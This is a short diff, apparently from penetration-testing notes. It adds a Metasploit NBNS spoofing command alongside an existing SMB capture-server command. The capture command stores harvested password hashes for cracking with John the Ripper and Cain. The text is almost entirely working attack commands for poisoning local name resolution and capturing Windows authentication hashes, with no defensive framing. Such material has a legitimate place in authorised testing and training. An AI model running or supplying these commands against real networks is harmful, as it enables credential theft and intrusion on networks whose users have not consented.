@@ -18,6 +18,10 @@ set JOHNPWFILE /path/to/store/john_hashes.txt
 set CAINPWFILE /path/to/store/cain_hashes.txt
 
 msfconsole -x "use auxiliary/server/capture/smb; set SRVHOST 192.168.178.136; set SRVPORT 445; set SMBDomain WORKGROUP; run"
+
+#using spoofing:
+msfconsole -q -x "use auxiliary/spoof/nbns/nbns_response; set SPOOFIP 192.168.1.103; set INTERFACE eth0; run; exit"
+
 ```
 
 using unc injector:
